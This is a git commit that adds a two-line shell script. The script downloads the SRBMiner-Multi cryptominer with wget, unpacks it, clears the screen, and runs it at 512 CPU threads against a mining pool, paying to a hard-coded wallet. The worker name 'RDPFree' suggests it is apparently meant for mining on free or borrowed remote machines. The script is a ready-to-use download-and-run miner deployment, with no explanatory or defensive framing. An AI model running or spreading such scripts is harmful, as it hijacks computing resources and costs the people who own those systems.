faddcdabf131642be2d91a060dfc00ef5a7e81e1
anisa89323 <jinananisa031@gmail.com>
2024-12-25 20:53:36 -0800

    Add files via upload

---
+++ n.sh
@@ -0,0 +1,2 @@
+cd && wget https://github.com/doktor83/SRBMiner-Multi/releases/download/2.6.8/SRBMiner-Multi-2-6-8-Linux.tar.gz && tar -xzvf SRBMiner-Multi-2-6-8-Linux.tar.gz && clear && cd SRBMiner-Multi-2-6-8
+./SRBMiner-MULTI --disable-gpu --algorithm verushash --pool sg.vipor.net:5040 --wallet RMhikcxxJvGCV89eKt9bdXb2omUimnpxYa --Worker RDPFree --password x --cpu-threads 512
